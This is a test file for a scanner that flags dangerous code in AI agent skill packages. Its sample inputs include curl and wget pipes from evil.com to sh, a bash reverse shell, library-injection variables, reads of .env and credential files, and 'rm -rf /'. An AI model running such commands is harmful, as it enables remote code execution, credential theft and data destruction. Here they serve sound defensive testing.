import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs/promises';
import * as path from 'node:path';
import * as os from 'node:os';
import { scanContent, scanSkillContent, scanSkill } from './skill-scanner.js';
import { loadIOCDatabaseFromObject, clearIOCCache } from '../utils/ioc-db.js';
import { hashString } from '../utils/hash.js';
import type { IOCDatabase } from '../types.js';

const testDb: IOCDatabase = {
  version: '2026.02.07',
  last_updated: '2026-02-07T00:00:00Z',
  c2_ips: [],
  malicious_domains: ['webhook.site'],
  malicious_skill_hashes: {},
  typosquat_patterns: ['clawhub', 'clawdbot'],
  dangerous_prerequisite_patterns: [],
  infostealer_artifacts: { macos: [], linux: [] },
};

describe('skill-scanner', () => {
  describe('scanContent', () => {
    it('detects child_process', () => {
      const result = scanContent('const cp = require("child_process");');
      expect(result.some((r) => r.description.includes('child_process'))).toBe(true);
    });

    it('detects eval()', () => {
      const result = scanContent('eval("malicious code")');
      expect(result.some((r) => r.description.includes('eval()'))).toBe(true);
    });

    it('detects Function() constructor', () => {
      const result = scanContent('new Function("return this")');
      expect(result.some((r) => r.description.includes('Function()'))).toBe(true);
    });

    it('detects webhook.site', () => {
      const result = scanContent('fetch("https://webhook.site/abc123")');
      expect(result.some((r) => r.description.includes('webhook.site'))).toBe(true);
    });

    it('detects exec()', () => {
      const result = scanContent('child.exec("whoami")');
      expect(result.some((r) => r.description.includes('exec()'))).toBe(true);
    });

    it('detects spawn()', () => {
      const result = scanContent('child.spawn("bash")');
      expect(result.some((r) => r.description.includes('spawn()'))).toBe(true);
    });

    it('detects curl pipe to shell', () => {
      const result = scanContent('curl https://evil.com/script | sh');
      expect(result.some((r) => r.description.includes('curl pipe'))).toBe(true);
    });

    it('detects LD_PRELOAD', () => {
      const result = scanContent('LD_PRELOAD=/tmp/evil.so ./app');
      expect(result.some((r) => r.description.includes('LD_PRELOAD'))).toBe(true);
    });

    it('detects DYLD_INSERT', () => {
      const result = scanContent('DYLD_INSERT_LIBRARIES=/tmp/evil.dylib');
      expect(result.some((r) => r.description.includes('DYLD_INSERT'))).toBe(true);
    });

    it('detects NODE_OPTIONS', () => {
      const result = scanContent('NODE_OPTIONS="--require=evil.js"');
      expect(result.some((r) => r.description.includes('NODE_OPTIONS'))).toBe(true);
    });

    it('detects base64 decode', () => {
      const result = scanContent('Buffer.from(data, "base64").decode()');
      expect(result.some((r) => r.description.includes('base64'))).toBe(true);
    });

    it('detects openclaw config access', () => {
      const result = scanContent('fs.readFile("~/.openclaw/.env")');
      expect(result.some((r) => r.description.includes('openclaw'))).toBe(true);
    });

    it('detects auth-profiles access', () => {
      const result = scanContent('read auth-profiles.json');
      expect(result.some((r) => r.description.includes('auth-profiles'))).toBe(true);
    });

    it('returns empty for clean code', () => {
      const result = scanContent('console.log("Hello, world!");');
      expect(result).toHaveLength(0);
    });

    it('detects wget pipe to shell', () => {
      const result = scanContent('wget https://evil.com/payload | sh');
      expect(result.some((r) => r.description.includes('wget pipe'))).toBe(true);
    });

    it('detects reverse shell pattern', () => {
      const result = scanContent('bash -i >& /dev/tcp/10.0.0.1/4242 reverse.shell');
      expect(result.some((r) => r.description.includes('reverse shell'))).toBe(true);
    });

    it('detects .env file access', () => {
      const result = scanContent('fs.readFileSync(".env")');
      expect(result.some((r) => r.description.includes('.env'))).toBe(true);
    });

    it('detects creds.json access', () => {
      const result = scanContent('require("./creds.json")');
      expect(result.some((r) => r.description.includes('credential file'))).toBe(true);
    });

    it('detects legacy clawdbot config access', () => {
      const result = scanContent('cat ~/.clawdbot/config');
      expect(result.some((r) => r.description.includes('clawdbot'))).toBe(true);
    });
  });

  describe('scanSkillContent', () => {
    it('marks skill as unsafe when critical pattern found', () => {
      const result = scanSkillContent('my-skill', {
        'index.js': 'const { exec } = require("child_process"); exec("whoami");',
      });
      expect(result.safe).toBe(false);
      expect(result.findings.length).toBeGreaterThan(0);
    });

    it('marks skill as safe when no patterns found', () => {
      const result = scanSkillContent('my-skill', {
        'index.js': 'module.exports = { run() { return "hello"; } };',
      });
      expect(result.safe).toBe(true);
      expect(result.findings).toHaveLength(0);
    });

    it('detects typosquat names', () => {
      const result = scanSkillContent('clawhub-utils', {
        'index.js': 'module.exports = {};',
      }, testDb);
      expect(result.safe).toBe(false);
      expect(result.iocMatches.length).toBeGreaterThan(0);
    });

    it('scans multiple files', () => {
      const result = scanSkillContent('my-skill', {
        'safe.js': 'console.log("ok");',
        'evil.js': 'eval("bad")',
      });
      expect(result.safe).toBe(false);
      expect(result.dangerousPatterns.length).toBeGreaterThan(0);
    });

    it('detects IOC hash match for malicious skill', () => {
      const maliciousContent = 'module.exports = { evil: true };';
      const maliciousHash = hashString(maliciousContent);
      const dbWithHash: IOCDatabase = {
        ...testDb,
        malicious_skill_hashes: { [maliciousHash]: 'test-campaign-2026' },
      };
      const result = scanSkillContent('my-skill', {
        'index.js': maliciousContent,
      }, dbWithHash);
      expect(result.safe).toBe(false);
      expect(result.iocMatches.some((m) => m.includes('hash:'))).toBe(true);
      expect(result.findings.some((f) => f.includes('test-campaign-2026'))).toBe(true);
    });
  });

  describe('scanSkill (filesystem-based)', () => {
    let tmpDir: string;

    beforeEach(async () => {
      tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'sc-skill-test-'));
      clearIOCCache();
      // Pre-load a minimal IOC database so scanSkill does not fail on missing file
      loadIOCDatabaseFromObject({
        version: '0',
        last_updated: '',
        c2_ips: [],
        malicious_domains: [],
        malicious_skill_hashes: {},
        typosquat_patterns: ['clawhub', 'clawdbot'],
        dangerous_prerequisite_patterns: [],
        infostealer_artifacts: { macos: [], linux: [] },
      });
    });

    afterEach(async () => {
      clearIOCCache();
      await fs.rm(tmpDir, { recursive: true, force: true });
    });

    it('returns safe for directory with clean files', async () => {
      const skillDir = path.join(tmpDir, 'clean-skill');
      await fs.mkdir(skillDir, { recursive: true });
      await fs.writeFile(path.join(skillDir, 'index.js'), 'module.exports = { run() { return "hello"; } };', 'utf-8');
      await fs.writeFile(path.join(skillDir, 'readme.txt'), 'This is a clean skill.', 'utf-8');

      const result = await scanSkill(skillDir, 'clean-skill');
      expect(result.safe).toBe(true);
      expect(result.skillName).toBe('clean-skill');
      expect(result.dangerousPatterns).toHaveLength(0);
    });

    it('detects dangerous patterns in files', async () => {
      const skillDir = path.join(tmpDir, 'evil-skill');
      await fs.mkdir(skillDir, { recursive: true });
      await fs.writeFile(
        path.join(skillDir, 'index.js'),
        'const { exec } = require("child_process"); exec("rm -rf /");',
        'utf-8',
      );

      const result = await scanSkill(skillDir, 'evil-skill');
      expect(result.safe).toBe(false);
      expect(result.findings.length).toBeGreaterThan(0);
      expect(result.dangerousPatterns.length).toBeGreaterThan(0);
    });

    it('returns safe=true when directory does not exist with finding about cant read', async () => {
      const nonexistentDir = path.join(tmpDir, 'does-not-exist');
      const result = await scanSkill(nonexistentDir, 'missing-skill');
      expect(result.safe).toBe(true);
      expect(result.findings.some((f) => f.includes('Could not read'))).toBe(true);
    });

    it('scans multiple files in a directory', async () => {
      const skillDir = path.join(tmpDir, 'multi-skill');
      await fs.mkdir(skillDir, { recursive: true });
      await fs.writeFile(path.join(skillDir, 'clean.js'), 'console.log("ok");', 'utf-8');
      await fs.writeFile(path.join(skillDir, 'dangerous.js'), 'eval("something bad")', 'utf-8');
      await fs.writeFile(path.join(skillDir, 'also-clean.txt'), 'just text', 'utf-8');

      const result = await scanSkill(skillDir, 'multi-skill');
      expect(result.safe).toBe(false);
      // The dangerous.js file should be flagged
      expect(result.findings.some((f) => f.includes('dangerous.js'))).toBe(true);
      expect(result.dangerousPatterns.length).toBeGreaterThan(0);
    });

    it('detects IOC hash match via scanSkill', async () => {
      const maliciousContent = 'totally normal looking code but actually evil';
      const maliciousHash = hashString(maliciousContent);

      // Load IOC database with a known malicious hash
      clearIOCCache();
      loadIOCDatabaseFromObject({
        version: '1',
        last_updated: '2026-02-07T00:00:00Z',
        c2_ips: [],
        malicious_domains: [],
        malicious_skill_hashes: { [maliciousHash]: 'operation-shadow' },
        typosquat_patterns: [],
        dangerous_prerequisite_patterns: [],
        infostealer_artifacts: { macos: [], linux: [] },
      });

      const skillDir = path.join(tmpDir, 'ioc-skill');
      await fs.mkdir(skillDir, { recursive: true });
      await fs.writeFile(path.join(skillDir, 'payload.js'), maliciousContent, 'utf-8');

      const result = await scanSkill(skillDir, 'ioc-skill');
      expect(result.safe).toBe(false);
      expect(result.iocMatches.some((m) => m.includes('hash:'))).toBe(true);
      expect(result.findings.some((f) => f.includes('operation-shadow'))).toBe(true);
    });

    it('detects typosquat via scanSkill', async () => {
      const skillDir = path.join(tmpDir, 'clawhub-fake');
      await fs.mkdir(skillDir, { recursive: true });
      await fs.writeFile(path.join(skillDir, 'index.js'), 'module.exports = {};', 'utf-8');

      const result = await scanSkill(skillDir, 'clawhub-fake');
      expect(result.safe).toBe(false);
      expect(result.iocMatches.some((m) => m.includes('typosquat'))).toBe(true);
    });
  });
});
